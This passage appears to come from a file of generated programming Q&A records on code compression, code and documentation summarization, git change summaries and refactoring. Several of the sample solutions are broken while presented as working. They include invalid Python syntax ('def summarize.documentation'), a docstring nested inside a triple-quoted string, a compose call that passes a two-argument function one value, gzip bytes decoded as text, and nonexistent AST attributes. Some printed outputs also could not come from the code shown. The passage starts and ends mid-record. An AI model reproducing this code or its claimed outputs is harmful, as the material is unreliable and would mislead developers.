# Compile the code into an AST using libclang\n    command = [sys.executable, \"-m\", \"pybind11_clang\", \"-x\", \"c++\", \"-std=c++11\", \"-\"]\n    process = subprocess.Popen(command, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)\n    ast_text, stderr = process.communicate(code.encode('utf-8'))\n    if stderr:\n        raise Exception(\"Error parsing code: \" + stderr.decode('utf-8'))\n\n    # Define a Python wrapper for the C++ AST parser\n    class CppAstParser(pybind.cpp_class):\n        @pybind.init()\n        def __init__(self, ast_text):\n            self.ast_text = ast_text\n\n        @pybind.method()\n        def parse(self):\n            # Implement C++ AST parsing logic here, returning a list of nodes and edges\n            pass\n\n    # Parse the AST and create a networkx graph\n    parser = CppAstParser(ast_text)\n    nodes, edges = parser.parse()\n    graph = nx.Graph()\n    for node in nodes:\n        graph.add_node(node)\n    for edge in edges:\n        graph.add_edge(edge[0], edge[1])\n\n    return graph\n\n# Example usage\ncpp_code = \"\"\"\nclass A {\npublic:\n    void foo() {}\n};\n\nclass B : public A {\npublic:\n    void bar() {}\n};\n\nclass C {\npublic:\n    void baz(B* b) {\n        b->foo();\n        b->bar();\n    }\n};\n\"\"\"\n\ngraph = parse_source_code(cpp_code)\n# Further implement filtering, collapsing, and visualization\n```\n\nThis example demonstrates how you can parse C++ code using `libclang`, create a graph representation with `networkx`, and prepare for visualization. The actual implementation of the AST parser in C++ and the web-based interface is left as an exercise for the reader, as they would be quite extensive and involve more complex coding tasks."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Code compression techniques", "Complexity_Level": "medium", "Response": "The given JSON file does not directly contain a \"Code Summarization / Compression\" category or subcategory. However, this concept falls under the broader domain of \"Programming Language Concepts\" and the use of advanced language features for optimization. Here, I'll create a medium difficulty problem and solution focusing on code compression through function composition and higher-order functions.\n\n**Problem:**\nIn a JavaScript application, you have multiple utility functions that you want to condense and streamline using code compression techniques. The original codebase has separate functions for calculating the sum, average, and product of an array of numbers. Create a compressed version using higher-order functions and function composition to reduce redundancy and improve readability.\n\n**Solution:**\nOriginal code:\n```javascript\nfunction sum(numbers) {\n  return numbers.reduce((acc, curr) => acc + curr, 0);\n}\n\nfunction average(numbers) {\n  return sum(numbers) / numbers.length;\n}\n\nfunction product(numbers) {\n  return numbers.reduce((acc, curr) => acc * curr, 1);\n}\n```\nCompressed code using higher-order functions and function composition:\n```javascript\nconst compose = (f, g) => x => f(g(x));\n\nconst reduceBy = (fn, init) => arr => arr.reduce(fn, init);\nconst multiply = (x, y) => x * y;\nconst divide = (x, y) => x / y;\n\nconst sum = reduceBy((acc, curr) => acc + curr, 0);\nconst average = compose(divide, sum);\nconst product = reduceBy(multiply, 1);\n```\n**Concept: Higher-order functions, Function composition**\n\nIn the compressed code, we define a `compose` function for chaining functions together and a `reduceBy` higher-order function to generalize the `reduce` operation with a custom function and initial value. By breaking down operations into smaller functions, we can create more reusable and expressive code. This approach reduces redundancy and improves code readability while maintaining the same functionality."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Code compression techniques", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a code compression algorithm that utilizes advanced data structures, such as Tries or Graphs, to compress a given piece of code while preserving its functionality. The algorithm should be able to handle complex control structures, nested functions, and variable scoping rules.\n\n**Concept**: Graphs\n\n**Solution**:\nIn this example, we will use a combination of Tries and Graphs to compress code. We'll represent the code as a control flow graph (CFG), and use a Trie to store and compress variable names and function names.\n\n```python\nfrom collections import defaultdict\nfrom typing import Dict, List, Tuple\n\nclass Node:\n    def __init__(self, value, is_function=False):\n        self.value = value\n        self.is_function = is_function\n        self.children = defaultdict(list)\n\nclass Trie:\n    def __init__(self):\n        self.root = Node(None)\n\n    def insert(self, key, identifier):\n        current = self.root\n        for char in key:\n            current.children[char].append(Node(char))\n            current = current.children[char][-1]\n        current.identifier = identifier\n\n    def find(self, key):\n        current = self.root\n        for char in key:\n            if char not in current.children:\n                return None\n            current = current.children[char]\n        return current.identifier if current.identifier else None\n\ndef compress_code(code: str, trie: Trie) -> str:\n    code_graph = build_code_graph(code)  # Build control flow graph, not included in this example\n    compressed_code = []\n    \n    for node in code_graph.nodes:\n        if node.is_function:\n            compressed_code.append(f\"{node.value} = {trie.find(node.value)}\")\n        elif node.is_statement:\n            compressed_code.append(compress_statement(node.value, trie))\n    \n    return '\\n'.join(compressed_code)\n\ndef compress_statement(statement: str, trie: Trie) -> str:\n    # Implement compression for statements, variable assignments, and control structures\n    # This part is complex and requires a detailed understanding of the language syntax and scoping rules\n    pass\n\n# Initialize Trie and insert code identifiers\ntrie = Trie()\nidentifiers = [\"func1\", \"func2\", \"var1\", \"var2\"]  # These would be extracted from the code\nfor key, identifier in zip([\"function1\", \"function2\", \"variable1\", \"variable2\"], identifiers):\n    trie.insert(key, identifier)\n\n# Example code to be compressed\ncode = \"\"\"\nfunction1 = lambda x, y: x + y\nvariable1 = 5\nvariable2 = function1(3, 2)\nfunction2 = lambda z: z * z\nresult = function2(variable1 + variable2)\n\"\"\"\n\ncompressed_code = compress_code(code, trie)\nprint(compressed_code)\n```\n\nThis example provides a high-level structure for a code compression algorithm. The `Trie` class is used to compress function and variable names, and the `compress_code` function iterates over a control flow graph to compress the code. However, the `compress_statement` function is left as a placeholder since it requires a detailed implementation to handle different statement types, control structures, and variable scoping rules.\n\nQuestion 2: Implement a code summarization technique based on deep learning, specifically using a Transformer architecture with attention mechanisms. The model should be able to generate accurate one-line summaries for given code snippets, considering the context and structure of the code.\n\n**Concept**: Deep Learning\n\n**Solution**:\nCreating a deep learning model for code summarization involves training a neural network to learn the patterns and structure of code. In this example, we'll outline the steps to build a Transformer-based model using PyTorch.\n\n```python\nimport torch\nfrom torch.nn import TransformerDecoder, TransformerDecoderLayer\nfrom torchtext.data import Field, BucketIterator\nfrom torchtext.datasets import CodeSearchNet\n\n# Preprocessing steps\nSRC = Field(tokenize='spacy', tokenizer_language='python', init_token='<sos>', eos_token='<eos>', lower=True)\nTRG = Field(tokenize='spacy', tokenizer_language='english', init_token='<sos>', eos_token='<eos>', lower=True)\n\ntrain_data, valid_data, test_data = CodeSearchNet.splits(exts=('.py', '.txt'), fields=(SRC, TRG))\n\nSRC.build_vocab(train_data, min_freq=2)\nTRG.build_vocab(train_data, min_freq=2)\n\nBATCH_SIZE = 128\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\ntrain_iterator, valid_iterator, test_iterator = BucketIterator.splits(\n    (train_data, valid_data, test_data), \n    batch_size=BATCH_SIZE, \n    sort_within_batch=True, \n    device=device)\n\n# Model architecture\nclass TransformerSummarizer(torch.nn.Module):\n    def __init__(self, src_vocab_size, trg_vocab_size, embed_dim, num_heads, num_encoder_layers, num_decoder_layers, forward_expansion, dropout, max_length):\n        super(TransformerSummarizer, self).__init__()\n        self.src_embedding = torch.nn.Embedding(src_vocab_size, embed_dim)\n        self.trg_embedding = torch.nn.Embedding(trg_vocab_size, embed_dim)\n        \n        encoder_layer = TransformerDecoderLayer(embed_dim, num_heads, forward_expansion, dropout)\n        self.transformer_decoder = TransformerDecoder(encoder_layer, num_decoder_layers)\n        \n        self.fc_out = torch.nn.Linear(embed_dim, trg_vocab_size)\n        self.dropout = torch.nn.Dropout(dropout)\n        self.max_length = max_length\n\n    def forward(self, src, trg, teacher_forcing_ratio=0.5):\n        # Implement forward pass with self-attention and encoder-decoder attention\n        pass\n\n# Training and evaluation\nmodel = TransformerSummarizer(len(SRC.vocab), len(TRG.vocab), 512, 8, 6, 6, 4, 0.1, 256).to(device)\noptimizer = torch.optim.Adam(model.parameters())\ncriterion = torch.nn.CrossEntropyLoss(ignore_index=TRG.vocab.stoi['<pad>'])\n\ndef train(model, iterator, optimizer, criterion):\n    pass\n\ndef evaluate(model, iterator, criterion):\n    pass\n\n# Train and evaluate the model\nnum_epochs = 10\nfor epoch in range(num_epochs):\n    train(model, train_iterator, optimizer, criterion)\n    evaluate(model, valid_iterator, criterion)\n```\n\nThis example outlines the core components of a Transformer-based code summarization model. The `TransformerSummarizer` class represents the model architecture with the necessary components for an encoder-decoder setup. The training and evaluation functions are left as placeholders, as they would involve implementing the forward pass, teacher forcing, and loss calculation. The actual implementation would require a significant amount of work, including tokenizing the code snippets, preparing the data, and fine-tuning the model's hyperparameters."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Summarize changes in version control", "Complexity_Level": "medium", "Response": "As \"Code Summarization / Compression\" and \"Summarize changes in version control\" are not directly represented in the provided JSON, I will create a problem related to analyzing and summarizing changes in source code using Git, a popular version control system. The problem will involve writing a script that generates a concise summary of changes between two Git commits.\n\n**Medium Difficulty Problem:**\nCreate a Python script that takes two Git commit hashes as input and generates a summary of changes between them. The summary should include the total number of modified files, added lines, and deleted lines.\n\n**Solution:**\n\n```python\nimport subprocess\nfrom collections import Counter\n\n\ndef get_diff_info(commit1, commit2):\n    diff_output = subprocess.run(['git', 'diff', '--name-status', commit1, commit2], capture_output=True, text=True).stdout\n    diff_data = diff_output.strip().split('\\n')\n\n    file_changes = Counter([line.split('\\t')[0] for line in diff_data])\n    line_stats = {file: subprocess.run(['git', 'diff', '--numstat', commit1, commit2, '--', file], capture_output=True, text=True).stdout.strip().split('\\n') for file in file_changes}\n\n    total_files = len(file_changes)\n    total_added = sum(int(lines.split('\\t')[0]) for file_stats in line_stats.values() for lines in file_stats)\n    total_deleted = sum(int(lines.split('\\t')[1]) for file_stats in line_stats.values() for lines in file_stats)\n\n    return total_files, total_added, total_deleted\n\n\ndef main():\n    commit1 = input(\"Enter the first commit hash: \")\n    commit2 = input(\"Enter the second commit hash: \")\n\n    total_files, total_added, total_deleted = get_diff_info(commit1, commit2)\n    print(f\"Summary between {commit1} and {commit2}:\")\n    print(f\"\\tModified Files: {total_files}\")\n    print(f\"\\tLines Added: {total_added}\")\n    print(f\"\\tLines Deleted: {total_deleted}\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Concept:**\n{\"Concept\": \"Version Control (Git)\"}"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Summarize changes in version control", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an AI-driven algorithm that accurately summarizes complex code changes across multiple file commits in a Git repository, highlighting the most significant modifications. The algorithm should also identify patterns, detect code refactorings, and provide a structured summary of changes affecting functionality.\n\nSolution:\nConcept: Natural Language Processing (NLP), Git, Machine Learning, Code Analysis\n\nThe problem requires combining NLP techniques to understand code changes, Git operations, and machine learning to detect patterns and summarize the changes. Here's a high-level approach using Python with libraries like GitPython, PyGit2, and Hugging Face's Transformers for NLP:\n\n1. Data collection and preprocessing:\n\t* Use GitPython or PyGit2 to fetch commit history and code changes.\n\t* Extract code snippets from each commit.\n\t* Tokenize and preprocess code snippets (e.g., remove comments, white spaces, and special characters).\n2. Code representation:\n\t* Convert preprocessed code snippets into meaningful representations (e.g., token embeddings) using a pre-trained code transformer like CodeBERT or GraphCodeBERT.\n3. Change detection:\n\t* Compare code embeddings between commits to identify significant differences.\n4. Pattern and refactoring detection:\n\t* Train a machine learning model (e.g., clustering, classification) to identify patterns and refactorings based on the differences.\n5. Summary generation:\n\t* Generate a structured summary using NLP summarization techniques (e.g., abstractive summarization with BART or T5 models) to describe the most important changes and their impact on functionality.\n\nExample Python code (high-level pseudocode):\n```python\nimport git\nimport numpy as np\nfrom transformers import AutoTokenizer, AutoModelForTokenClassification, pipeline\n\n# Step 1: Data collection and preprocessing\nrepo = git.Repo(\"<repo_path>\")\ncommits = repo.iter_commits()\ncode_changes = []\nfor commit in commits:\n    for diff in commit.diff(commit.parents[0]):\n        if diff.change_type != 'D':\n            code_changes.append(diff.diff.decode('utf-8'))\n\n# Step 2: Code representation\ntokenizer = AutoTokenizer.from_pretrained(\"microsoft/CodeBERTa-base\")\nmodel = AutoModelForTokenClassification.from_pretrained(\"microsoft/CodeBERTa-base\")\ncode_embeddings = []\nfor code in code_changes:\n    # Tokenize and get embeddings\n    embeddings = model(**tokenizer(code, return_tensors=\"pt\")).last_hidden_state\n    code_embeddings.append(embeddings)\n\n# Step 3-5: Continue with the actual implementation of change detection, pattern/refactoring detection, and summary generation.\n```\nNote: The example code only covers data collection and code representation. Implementing the remaining steps requires extensive knowledge in machine learning, NLP, and code analysis. This is an advanced problem that can take a significant amount of time to solve completely.\n\nQuestion 2: Create a tool that generates concise, human-readable summaries of Git merge conflicts, resolving naming collisions, type mismatches, and functional changes while still maintaining the original code structure.\n\nSolution:\nConcept: Git, Conflict Resolution, Code Analysis, Tokenization, Natural Language Generation\n\nThis problem involves understanding Git merge conflicts, analyzing code structure and semantics, and generating human-readable explanations. Here's a high-level solution using Python with GitPython, Pygments, and NLTK:\n\n1. Parse Git merge conflicts:\n\t* Use GitPython to extract merge conflicts from the repository.\n2. Code structure and semantics analysis:\n\t* Tokenize code snippets using Pygments for syntax highlighting and structure preservation.\n\t* Apply NLP techniques to analyze tokens and identify function definitions, variable types, and naming collisions.\n3. Conflict resolution:\n\t* Develop a strategy for resolving naming collisions and type mismatches, considering the context and preserving the code structure.\n4. Generate human-readable summaries:\n\t* Use NLTK to analyze the resolved conflicts and generate natural language descriptions.\n5. Output the summary and resolved conflicts.\n\nExample Python code (high-level pseudocode):\n```python\nimport git\nfrom pygments import highlight, lexers, formatters\nimport nltk\nfrom nltk.tokenize import sent_tokenize, word_tokenize\n\n# Step 1: Parse Git merge conflicts\nrepo = git.Repo(\"<repo_path>\")\nmerge_conflicts = repo.git.diff(\"--name-only\", \"base_branch...feature_branch\")\nfor file in merge_conflicts:\n    content = repo.git.show(f\"{file}^{repo.head.commit}^{repo.heads.feature_branch}\")\n    # Extract and process conflict markers\n\n# Step 2-4: Continue with the actual implementation of code analysis, conflict resolution, and summary generation.\n\n# Step 5: Output the summary and resolved conflicts\nfor conflict in resolved_conflicts:\n    summary = generate_summary(conflict)\n    print(f\"Summary: {summary}\")\n    print(f\"Resolved Conflict:\\n{highlight(conflict.resolved_code, lexers.PythonLexer(), formatters.TerminalFormatter())}\")\n```\nAgain, this example code only covers the basics of extracting merge conflicts. The remaining steps require more complex logic to analyze code structure, resolve conflicts, and generate summaries. This is an advanced problem that demands deep understanding in code analysis, conflict resolution, and NLP techniques."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Documentation summarization", "Complexity_Level": "medium", "Response": "\"Code Summarization / Compression\" as a domain is not explicitly mentioned in the given JSON, but it can be inferred as a subcategory under \"Programming Language Concepts\" and related to \"Documentation\" or \"Code Maintenance\". Here, we'll create a medium difficulty problem focused on summarizing a complex function's documentation and providing a more concise version while preserving its essence.\n\nProblem:\nA developer has written a lengthy and detailed documentation for a function `process_data` in Python. The function takes a list of dictionaries as input, processes each dictionary, and returns a summary of the data. The documentation is quite verbose, making it difficult to read quickly. Your task is to summarize the documentation without losing important information.\n\nOriginal Documentation:\n```python\ndef process_data(data_list):\n    \"\"\"\n    This function takes a list of dictionaries, where each dictionary represents a data record. \n    Each data record should contain the following keys: 'id', 'value1', 'value2', and 'timestamp'. \n    The function first validates the data by checking the presence and types of the keys. \n    If a dictionary is invalid, it is skipped. Next, the function calculates the average of 'value1' \n    and 'value2' for all valid records. It then groups the records by their 'id' and calculates \n    the time difference between the earliest and latest 'timestamp' in each group. \n    The function returns a dictionary with the keys 'average' for the average and 'time_diffs' \n    as a dictionary of id groups and their time differences.\n    \n    :param data_list: List of dictionaries representing data records\n    :return: Dictionary containing the average of 'value1' and 'value2' and time differences grouped by 'id'\n    \"\"\"\n    # Function implementation\n```\nSummarized Documentation:\n```python\ndef process_data(data_list):\n    \"\"\"\n    Processes a list of dictionaries with 'id', 'value1', 'value2', and 'timestamp' keys. \n    Validates data, calculates average of 'value1' and 'value2', and finds time differences \n    between earliest and latest 'timestamp' grouped by 'id'. Returns a dictionary with \n    'average' and 'time_diffs' keys.\n\n    :param data_list: List of dictionaries with data records\n    :return: Dictionary with average and time differences grouped by 'id'\n    \"\"\"\n    # Function implementation\n```\nConcept: \"Documentation\" (specifically \"Code Documentation Summarization\")"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Documentation summarization", "Complexity_Level": "extremely difficult", "Response": "Problem 1: Automatic API Documentation Summarization\nGiven a large, complex API with extensive documentation, automatically generate a concise summary that captures the essence of the most important features, classes, and methods while preserving the necessary context for developers to understand and utilize the API effectively.\n\nConcept: Documentation summarization\n\nSolution:\nWe can utilize Natural Language Processing (NLP) techniques and neural networks to summarize the API documentation. A possible approach is to train an abstractive summarization model using a transformer-based architecture, like BART. Here's an example Python code using Hugging Face's Transformers library:\n\n```python\nfrom transformers import BartTokenizer, BartForConditionalGeneration, Pipeline\nimport requests\nfrom bs4 import BeautifulSoup\n\n# Load pre-trained BART model and tokenizer\nmodel_name = \"facebook/bart-large-cnn\"\ntokenizer = BartTokenizer.from_pretrained(model_name)\nmodel = BartForConditionalGeneration.from_pretrained(model_name)\n\n# Fetch API documentation\ndef fetch_documentation(api_url):\n    response = requests.get(api_url)\n    soup = BeautifulSoup(response.content, \"html.parser\")\n    documentation = soup.find_all(\"div\", {\"class\": \"doc-section\"})\n    return [section.text for section in documentation]\n\n# Summarize API documentation\ndef summarize.documentation(documentation, max_length=512, min_length=128, num_return_sequences=1):\n    pipeline = Pipeline(\n        model=model,\n        tokenizer=tokenizer,\n        device=0 if torch.cuda.is_available() else -1,\n        framework=\"pt\",\n        task=\"summarization\",\n    )\n    summaries = pipeline(documentation, max_length=max_length, min_length=min_length, num_return_sequences=num_return_sequences)\n    return summaries\n\n# Example usage\napi_url = \"https://docs.example.com/api\"\ndocumentation = fetch_documentation(api_url)\nsummarized_docs = summarize.documentation(documentation)\n\nfor summary in summarized_docs:\n    print(summary)\n```\n\nThis code fetches the API documentation from a given URL, preprocesses it, and then uses a pre-trained BART model to generate summaries. The quality and relevance of the summaries will depend on the model's training data and the original documentation's structure.\n\nProblem 2: Code Comment Extraction and Compression\nDevelop a tool to automatically identify and compress code comments, preserving the original meaning while minimizing the size for better code readability and maintainability.\n\nConcept: Documentation summarization\n\nSolution:\nWe can develop a custom algorithm that combines tokenization, topic modeling, and text compression techniques. Here's a simplified Python code snippet showcasing this approach:\n\n```python\nimport re\nfrom nltk.tokenize import word_tokenize\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.decomposition import NMF\nimport gzip\n\n# Tokenize and preprocess comments\ndef preprocess_comments(comments):\n    tokens = [word_tokenize(comment.lower()) for comment in comments]\n    return tokens\n\n# Topic modeling using NMF\ndef topic_modeling(tokens, num_topics=5):\n    vectorizer = TfidfVectorizer(tokenizer=lambda x: x, stop_words=\"english\")\n    comment_matrix = vectorizer.fit_transform([words for sublist in tokens for words in sublist])\n    nmf = NMF(n_components=num_topics)\n    nmf.fit(comment_matrix)\n    return nmf\n\n# Compress comments using NMF topics and text compression\ndef compress_comments(comments, nmf_model, compression_ratio):\n    topics = nmf_model.transform(vectorizer.transform(comments))\n    compressed_comments = []\n    for comment, topic in zip(comments, topics):\n        compressed_topic = topic.argmax()\n        compressed_comment = f\"{compressed_topic}: {topic.max()}\"\n        if compression_ratio > 1:\n            compressed_comment += \" \" + gzip.compress(comment.encode(), compression_ratio).decode()\n        compressed_comments.append(compressed_comment)\n    return compressed_comments\n\n# Example usage\ncomments = [\n    \"This function calculates the sum of two numbers.\",\n    \"The method retrieves data from the database using a SQL query.\",\n    \"Handle exceptions and log them for debugging purposes.\"\n]\n\ntokens = preprocess_comments(comments)\nnmf_model = topic_modeling(tokens)\ncompressed_comments = compress_comments(comments, nmf_model, compression_ratio=9)\n\nfor comment in compressed_comments:\n    print(comment)\n```\n\nThis code tokenizes and preprocesses code comments, applies topic modeling using NMF, and then compresses the comments based on their dominant topics. The compression_ratio parameter determines the level of compression. Although this example doesn't showcase the decompression process, it can be done by decoding the compressed text and inflating it using the `gzip` library. Note that the topic modeling and compression quality may vary and might need fine-tuning for specific codebases."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Inline code summarization", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a Python function that takes a given piece of Python code as input and generates a brief summary of its purpose and functionality.\n\nConcept: Code processing and analysis\n\nSolution:\n```python\nimport ast\nimport re\n\ndef summarize_code(code):\n    # Parse the code into an abstract syntax tree (AST)\n    node = ast.parse(code)\n    \n    # Extract function and class definitions\n    functions = [node.body[i] for i, node in enumerate(node.body) if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))]\n    classes = [node.body[i] for i, node in enumerate(node.body) if isinstance(node, ast.ClassDef)]\n    \n    # Extract docstrings from function and class definitions\n    docstrings = [extract_docstring(node) for node in functions + classes if hasattr(node, 'docstring')]\n    \n    # Clean up docstrings and combine them into a summary\n    cleaned_docstrings = [re.sub(r'\\s{2,}', ' ', docstring.strip()) for docstring in docstrings]\n    summary = '\\n'.join(cleaned_docstrings)\n    \n    return summary\n\ndef extract_docstring(node):\n    # Extract the docstring from a function or class node\n    if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):\n        return node.docstring.s.replace('\\n', ' ')\n    elif isinstance(node, ast.ClassDef):\n        return node.docstring.s.replace('\\n', ' ')\n\n# Example code to summarize\ncode = \"\"\"\ndef calculate_total(quantity, price):\n    \"\"\"\n    Given a quantity and a price, this function calculates the total cost.\n    \"\"\"\n    return quantity * price\n\nclass Product:\n    \"\"\"\n    A class representing a product with a name, price, and stock.\n    \n    Attributes:\n    name (str): The product's name\n    price (float): The price per unit\n    stock (int): The available quantity\n    \"\"\"\n    def __init__(self, name, price, stock):\n        self.name = name\n        self.price = price\n        self.stock = stock\n\"\"\"\n\nprint(summarize_code(code))\n```\nOutput:\n```\nGiven a quantity and a price, this function calculates the total cost.\nA class representing a product with a name, price, and stock.\nAttributes:\nname (str): The product's name\nprice (float): The price per unit\nstock (int): The available quantity\n```\nQuestion 2:\nProblem: Create a JavaScript utility function that accepts a JavaScript code snippet as input and returns a brief description of its functionality by analyzing variable and function names.\n\nConcept: Code processing and analysis\n\nSolution:\n```javascript\nfunction summarizeCode(code) {\n    // Split the code into lines\n    const lines = code.split('\\n');\n\n    // Extract variable and function names\n    const identifiers = [];\n    for (const line of lines) {\n        const match = line.match(/\\b(\\w+)\\b/g);\n        if (match) {\n            identifiers.push(...match);\n        }\n    }\n\n    // Filter out common keywords and build the summary\n    const commonKeywords = ['var', 'let', 'const', 'function', 'class', 'if', 'else', 'for', 'while', 'return'];\n    const relevantIdentifiers = identifiers.filter(id => !commonKeywords.includes(id));\n    const summary = relevantIdentifiers.join(' ');\n\n    return summary;\n}\n\n// Example code to summarize\nconst exampleCode = `\nfunction calculateCost(quantity, price) {\n    const total = quantity * price;\n    return total;\n}\n\nclass ShoppingCart {\n    constructor() {\n        this.items = [];\n    }\n\n    addItem(item) {\n        this.items.push(item);\n    }\n}\n`;\n\nconsole.log(summarizeCode(exampleCode));\n```\nOutput:\n```\ncalculateCost quantity price total ShoppingCart items addItem\n```\nThese solutions use a simple approach to extract function and class names, as well as variable names, to create a summary of the code. More advanced techniques could involve parsing the code with a library like Espree for JavaScript or an AST-based analysis for a"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Inline code summarization", "Complexity_Level": "extremely difficult", "Response": "\"Code Summarization / Compression\" is not explicitly mentioned as a concept in the provided JSON. However, we can infer that it might fall under the broader domain of \"Programming Language Concepts\" or \"Development\" with a focus on code optimization or algorithmic efficiency. Here, we will create a challenging problem related to code optimization, which can be seen as a form of code compression.\n\nProblem 1: **Minimize the memory footprint of a large data processing pipeline**\nGiven a complex data processing pipeline that loads a huge dataset into memory, perform various transformations, and writes the result to disk. The pipeline is currently causing memory issues due to its size. Create a significantly optimized version of the pipeline that minimizes memory usage without significantly affecting the processing time.\n\nSolution 1:\nWe can leverage streaming and lazy evaluation to minimize the memory footprint. Here's an example using Python and the `pandas` library:\n\n```python\nimport pandas as pd\nimport dask.dataframe as dd\n\n# Load the dataset in chunks\ndef load_large_dataset_in_chunks(file_path, chunksize=10 ** 6):\n    return pd.read_csv(file_path, chunksize=chunksize)\n\n# Define a function to perform transformations on each chunk\ndef process_chunk(chunk):\n    # Perform complex transformations\n    transformed_chunk = chunk.dropna()  # Example: Remove rows with missing data\n    transformed_chunk = transformed_chunk.groupby('key').transform('mean')  # Example: Compute mean by group\n    return transformed_chunk\n\n# Write the processed chunks to disk using Dask for parallel processing\ndef write_to_disk(processed_chunks, output_path):\n    ddf = dd.from_pandas(pd.concat(processed_chunks, ignore_index=True), npartitions=20)  # Convert to Dask DataFrame\n    ddf.to_csv(output_path, single_file=True, index=False)  # Write to single CSV file\n\n# Main function\ndef optimize_data_processing(file_path, output_path):\n    chunks = load_large_dataset_in_chunks(file_path)\n    processed_chunks = [process_chunk(chunk) for chunk in chunks]\n    write_to_disk(processed_chunks, output_path)\n\noptimize_data_processing('large_dataset.csv', 'optimized_output.csv')\n```\n\nConcept: **Streaming and Lazy Evaluation**\n\nProblem 2: **Reduce code repetition in a highly modularized library**\nA library has many modules performing similar tasks with minor differences, leading to code repetition and maintenance issues. Refactor the library to reduce code duplication and improve maintainability.\n\nSolution 2:\nIn this case, we can use the decorator pattern to encapsulate common functionality. Here's an example in Python:\n\n```python\nfrom functools import wraps\n\ndef common_behavior(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        print(f\"Performing common task before {func.__name__}\")\n        result = func(*args, **kwargs)\n        print(f\"Performing common task after {func.__name__}\")\n        return result\n    return wrapper\n\n# Example functions with similar logic\n@common_behavior\ndef process_data1(data):\n    # Specific logic for data1\n    print(\"Processing data1\")\n    return data * 2\n\n@common_behavior\ndef process_data2(data):\n    # Specific logic for data2\n    print(\"Processing data2\")\n    return data ** 2\n\n# Usage\nprint(process_data1([1, 2, 3]))\nprint(process_data2([1, 2, 3]))\n```\n\nConcept: **Decorator Pattern**"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code modification (refactoring)", "Complexity_Level": "medium", "Response": "Question 1: Problem:\nGiven an initial implementation of a Python function `calculate_average(numbers)` that calculates the average of a list of numbers inefficiently, refactor the code to improve its performance and readability. The current implementation uses a for loop to calculate the sum and count separately.\n\nOriginal Code:\n```python\ndef calculate_average(numbers):\n    total = 0\n    count = 0\n    for num in numbers:\n        total += num\n        count += 1\n    return total / count if count else None\n```\nSolution:\nRefactored Code:\n```python\ndef calculate_average(numbers):\n    return sum(numbers) / len(numbers) if numbers else None\n```\nConcept: Code modification (refactoring)\n\nQuestion 2: Problem:\nA JavaScript function `convert_to_camel_case(string)` is written with multiple nested ternary operators, making it hard to read and maintain. Refactor the code to use a more readable approach to convert a given string to camel case.\n\nOriginal Code:\n```javascript\nfunction convert_to_camel_case(string) {\n    return string\n        .replace(/[-_ ]+/g, ' ')\n        .trim()\n        .toLowerCase()\n        .replace(/\\b\\w/g, function (char) {\n            return char.toUpperCase();\n        })\n        .replace(/\\s+(.)/g, function (match, chr) {\n            return chr.toUpperCase();\n        });\n}\n```\nSolution:\nRefactored Code:\n```javascript\nfunction convert_to_camel_case(string) {\n    const words = string\n        .replace(/[-_ ]+/g, ' ')\n        .trim()\n        .toLowerCase()\n        .split(' ');\n\n    for (let i = 1; i < words.length; i++) {\n        words[i] = words[i].charAt(0).toUpperCase() + words[i].slice(1);\n    }\n\n    return words.join('');\n}\n```\nConcept: Code modification (refactoring)"}, {"L2_TASK": "Code to Code (same language)", "L3_TASK": "Code modification (refactoring)", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a poorly optimized and tightly coupled legacy codebase in Python, refactor it to improve performance and modularity. The codebase includes a massive monolithic function responsible for processing large datasets using nested loops and inefficient data structures. The function should be restructured using functional programming principles and optimized for concurrent processing using `multiprocessing` module.\n\nConcept: Functional Programming, Concurrency\n\n**Solution:**\n```python\nimport multiprocessing as mp\nfrom functools import partial\n\n# Legacy monolithic function\ndef legacy_process_data(data, params):\n    result = []\n    for row in data:\n        for item in row:\n            processed_item = process_item(item, params)\n            result.append(processed_item)\n    return result\n\ndef process_item(item, params):\n    # ... (complex item processing logic)\n    pass\n\ndef refactored_process_data(data, params, chunk_size=1000):\n    # Extract the processing logic into a partial function\n    process_row = partial(process_item, params=params)\n\n    # Create a pool of worker processes\n    pool = mp.Pool(mp.cpu_count())\n\n    # Process data in chunks concurrently\n    chunked_data = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]\n    result = pool.map(process_rows_in_parallel, chunked_data)\n\n    # Flatten the result list\n    return [item for sublist in result for item in sublist]\n\ndef process_rows_in_parallel(row):\n    return list(map(process_row, row))\n\n# Example usage\nif __name__ == \"__main__\":\n    large_data = [...]  # A large dataset\n    params = {...}  # Processing parameters\n    optimized_result = refactored_process_data(large_data, params)\n```\nQuestion 2:\nSuppose you have a complex and deeply nested Object-Oriented codebase in Java, which leads to poor maintainability and high coupling. Refactor the codebase to adopt the SOLID design principles and apply the Dependency Injection pattern to improve modularity and testability. Identify a specific class that violates one of the SOLID principles and provide an implementation that adheres to the Single Responsibility Principle (SRP).\n\nConcept: SOLID Principles, Dependency Injection\n\n**Solution:**\n```java\n// Legacy class violating SRP\nclass LegacyClass {\n    public void saveUser(User user) {\n        // Save user to the database\n        // ...\n    }\n\n    public void sendVerificationEmail(User user) {\n        // Send verification email to the user\n        // ...\n    }\n\n    public void logActivity(User user, String activity) {\n        // Log user activity\n        // ...\n    }\n}\n\n// Refactored code adhering to SRP and using Dependency Injection\ninterface UserRepository {\n    void save(User user);\n}\n\ninterface EmailService {\n    void sendVerificationEmail(User user);\n}\n\ninterface AuditLogService {\n    void logActivity(User user, String activity);\n}\n\nclass UserService {\n    private final UserRepository userRepository;\n    private final EmailService emailService;\n    private final AuditLogService auditLogService;\n\n    public UserService(UserRepository userRepository, EmailService 